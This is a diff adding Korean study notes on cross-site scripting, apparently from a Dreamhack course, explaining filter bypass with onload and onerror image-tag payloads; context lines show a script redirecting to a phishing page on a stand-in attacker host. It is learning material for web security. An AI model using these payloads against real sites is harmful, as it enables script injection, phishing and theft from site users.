@@ -66,3 +66,32 @@ location.href = "http://hacker.dreamhack.io/phishing";
 window.open("http://hacker.dreamhack.io/")
 </script>
 ```
+
+<br>
+
+
+## XSS 필터링 우회
+
+여러 방법중에 이벤트 핸들러 속성을 이용한 방법을 알아보면
+
+### onload 이벤트 핸들러
+
+해당 태그가 요청하는 데이터 로드에 성공하면 이벤트 핸들러를 실행합니다.
+
+```html
+<img src="https://dreamhack.io/valid.jpg" onload="alert(document.domain)">
+```
+
+데이터 로드가 성공하도록 유도해서 뒤에 코드를 실행시킬 수 있습니다.
+
+#
+
+### onerror 이벤트 핸들러
+
+해당 태그가 요청한느 테이터 로드가 실패하면 이벤트 핸들러를 실행합니다.
+
+```html
+<img src="valid.jpg" onerror="alert(document.domain)">
+```
+
+데이터 로드가 실패하도록 유도해서 뒤에 코드를 실행시킬 수 있습니다.
